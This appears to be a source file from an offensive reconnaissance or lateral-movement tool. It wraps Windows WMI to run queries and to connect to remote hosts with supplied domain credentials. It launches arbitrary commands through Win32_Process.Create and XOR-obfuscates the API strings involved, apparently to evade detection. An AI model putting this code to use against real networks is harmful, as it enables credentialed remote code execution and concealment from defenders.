#include "WmiHelpers.h"
#include "../utils/Obfuscator.h"
#include <stdexcept>

namespace recon {

WmiResult::WmiResult(IWbemClassObject* obj) : pObj_(obj) {
    if (pObj_) {
        pObj_->AddRef();
    }
}

WmiResult::~WmiResult() {
    if (pObj_) {
        pObj_->Release();
        pObj_ = nullptr;
    }
}

WmiResult::WmiResult(const WmiResult& other) : pObj_(other.pObj_) {
    if (pObj_) {
        pObj_->AddRef();
    }
}

WmiResult& WmiResult::operator=(const WmiResult& other) {
    if (this != &other) {
        if (pObj_) pObj_->Release();
        pObj_ = other.pObj_;
        if (pObj_) pObj_->AddRef();
    }
    return *this;
}

WmiResult::WmiResult(WmiResult&& other) noexcept : pObj_(other.pObj_) {
    other.pObj_ = nullptr;
}

WmiResult& WmiResult::operator=(WmiResult&& other) noexcept {
    if (this != &other) {
        if (pObj_) pObj_->Release();
        pObj_ = other.pObj_;
        other.pObj_ = nullptr;
    }
    return *this;
}

std::wstring WmiResult::getString(const wchar_t* propName) {
    VARIANT vtProp;
    VariantInit(&vtProp);
    if (SUCCEEDED(pObj_->Get(propName, 0, &vtProp, 0, 0)) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
        std::wstring result(vtProp.bstrVal);
        VariantClear(&vtProp);
        return result;
    }
    VariantClear(&vtProp);
    return L"";
}

int WmiResult::getInt(const wchar_t* propName) {
    VARIANT vtProp;
    VariantInit(&vtProp);
    if (SUCCEEDED(pObj_->Get(propName, 0, &vtProp, 0, 0))) {
        int result = 0;
        if (vtProp.vt == VT_I4) result = vtProp.lVal;
        else if (vtProp.vt == VT_UI4) result = vtProp.ulVal;
        else if (vtProp.vt == VT_INT) result = vtProp.intVal;
        else if (vtProp.vt == VT_UINT) result = vtProp.uintVal;
        VariantClear(&vtProp);
        return result;
    }
    VariantClear(&vtProp);
    return 0;
}

unsigned long long WmiResult::getUnsignedLongLong(const wchar_t* propName) {
    VARIANT vtProp;
    VariantInit(&vtProp);
    if (SUCCEEDED(pObj_->Get(propName, 0, &vtProp, 0, 0))) {
        unsigned long long result = 0;
        if (vtProp.vt == VT_UI8) result = vtProp.ullVal;
        else if (vtProp.vt == VT_I8) result = vtProp.llVal;
        else if (vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
            try { result = std::stoull(vtProp.bstrVal); } catch(...) {}
        }
        VariantClear(&vtProp);
        return result;
    }
    VariantClear(&vtProp);
    return 0;
}


WmiSession::WmiSession() : WmiSession(L"ROOT\\CIMV2") {}

WmiSession::WmiSession(const std::wstring& nameSpace) {
    IWbemLocator* pLoc = nullptr;
    HRESULT hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) {
        throw std::runtime_error("Failed to create WbemLocator instance.");
    }

    hres = pLoc->ConnectServer(_bstr_t(nameSpace.c_str()), NULL, NULL, 0, 0, 0, 0, &pSvc_);
    pLoc->Release();
    if (FAILED(hres)) {
        throw std::runtime_error("Failed to connect to WMI service.");
    }

    hres = CoSetProxyBlanket(pSvc_, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hres)) {
        pSvc_->Release();
        pSvc_ = nullptr;
        throw std::runtime_error("Failed to set proxy blanket.");
    }
    comSecurityInitialized_ = true;
}

WmiSession::~WmiSession() {
    Release();
}

void WmiSession::Release() {
    if (pSvc_) {
        pSvc_->Release();
        pSvc_ = nullptr;
    }
}

bool WmiSession::ConnectRemote(const std::wstring& server,
                               const std::wstring& user,
                               const std::wstring& domain,
                               const std::wstring& password,
                               const std::wstring& nameSpace) {
    Release();

    IWbemLocator* pLoc = nullptr;
    HRESULT hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) return false;

    std::wstring path = L"\\\\" + server + L"\\" + nameSpace;
    std::wstring fullUser = user;
    if (!domain.empty() && !user.empty()) {
        fullUser = domain + L"\\" + user;
    }

    _bstr_t bstrUser(fullUser.c_str());
    _bstr_t bstrPass(password.c_str());

    hres = pLoc->ConnectServer(
        _bstr_t(path.c_str()),
        user.empty() ? NULL : (BSTR)bstrUser,
        password.empty() ? NULL : (BSTR)bstrPass,
        NULL, 0, NULL, NULL, &pSvc_
    );

    pLoc->Release();
    if (FAILED(hres)) return false;

    hres = CoSetProxyBlanket(
        pSvc_, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE
    );

    if (FAILED(hres)) {
        Release();
        return false;
    }

    return true;
}

HRESULT WmiSession::ExecProcessCreate(const std::wstring& commandLine,
                                      unsigned long* returnValue,
                                      unsigned long* processId) {
    if (!pSvc_) return E_FAIL;

    // "Win32_Process"
    std::wstring className = utils::xor_wstr(L"\x0d\x33\x34\x69\x68\x05\x0a\x28\x35\x39\x3f\x29\x29", 13);
    // "Create"
    std::wstring methodName = utils::xor_wstr(L"\x19\x28\x3f\x3b\x2e\x3f", 6);

    IWbemClassObject* pClass = nullptr;
    HRESULT hr = pSvc_->GetObject(_bstr_t(className.c_str()), 0, NULL, &pClass, NULL);
    if (FAILED(hr)) return hr;

    IWbemClassObject* pInParamsDefinition = nullptr;
    hr = pClass->GetMethod(_bstr_t(methodName.c_str()), 0, &pInParamsDefinition, NULL);
    if (FAILED(hr)) {
        pClass->Release();
        return hr;
    }

    IWbemClassObject* pInParams = nullptr;
    hr = pInParamsDefinition->SpawnInstance(0, &pInParams);
    if (FAILED(hr)) {
        pInParamsDefinition->Release();
        pClass->Release();
        return hr;
    }

    VARIANT varCmd;
    varCmd.vt = VT_BSTR;
    varCmd.bstrVal = SysAllocString(commandLine.c_str());
    // "CommandLine"
    hr = pInParams->Put(utils::xor_wstr(L"\x19\x35\x37\x37\x3b\x34\x3e\x16\x33\x34\x3f", 11).c_str(), 0, &varCmd, 0);
    VariantClear(&varCmd);

    IWbemClassObject* pOutParams = nullptr;
    hr = pSvc_->ExecMethod(_bstr_t(className.c_str()), _bstr_t(methodName.c_str()), 0, NULL, pInParams, &pOutParams, NULL);

    if (SUCCEEDED(hr) && pOutParams) {
        if (returnValue) {
            VARIANT varRet;
            // "ReturnValue"
            if (SUCCEEDED(pOutParams->Get(utils::xor_wstr(L"\x08\x3f\x2e\x2f\x28\x34\x0c\x3b\x36\x2f\x3f", 11).c_str(), 0, &varRet, NULL, 0))) {
                *returnValue = varRet.ulVal;
                VariantClear(&varRet);
            }
        }
        if (processId) {
            VARIANT varPid;
            // "ProcessId"
            if (SUCCEEDED(pOutParams->Get(utils::xor_wstr(L"\x0a\x28\x35\x39\x3f\x29\x29\x13\x3e", 9).c_str(), 0, &varPid, NULL, 0))) {
                *processId = varPid.ulVal;
                VariantClear(&varPid);
            }
        }
        pOutParams->Release();
    }

    pInParams->Release();
    pInParamsDefinition->Release();
    pClass->Release();

    return hr;
}

std::vector<WmiResult> WmiSession::execQuery(const std::wstring& query) {
    IEnumWbemClassObject* pEnumerator = nullptr;
    HRESULT hres = pSvc_->ExecQuery(_bstr_t(L"WQL"), _bstr_t(query.c_str()),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
    if (FAILED(hres)) {
        throw std::runtime_error("WMI query failed.");
    }

    std::vector<WmiResult> results;
    IWbemClassObject* pclsObj = nullptr;
    ULONG uReturn = 0;
    while (pEnumerator) {
        pEnumerator->Next(static_cast<long>(WBEM_INFINITE), 1, &pclsObj, &uReturn);
        if (0 == uReturn) {
            break;
        }
        results.emplace_back(pclsObj);
        pclsObj->Release();
    }
    pEnumerator->Release();

    return results;
}

} // namespace recon
